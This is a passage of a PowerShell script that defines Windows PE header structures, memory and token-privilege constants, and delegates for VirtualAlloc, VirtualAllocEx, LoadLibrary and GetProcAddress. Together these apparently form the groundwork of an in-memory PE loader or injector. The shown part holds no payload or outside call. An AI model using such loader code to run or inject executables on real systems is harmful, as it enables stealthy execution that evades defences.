		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress 
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
